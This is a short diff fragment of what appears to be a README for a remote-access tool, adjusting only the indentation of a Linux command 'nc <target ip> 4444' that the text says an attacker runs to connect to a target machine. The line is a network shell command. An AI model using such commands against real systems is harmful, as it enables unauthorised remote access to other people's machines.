@@ -51,7 +51,7 @@ This tool is designed to:
 - The command attacjer needs to run in their machines.
   - For Linux
     ```bash
-   nc <ip_address_of _the_target_machine> 4444
+    nc <ip_address_of _the_target_machine> 4444
   
   - For Windows
     ```bash
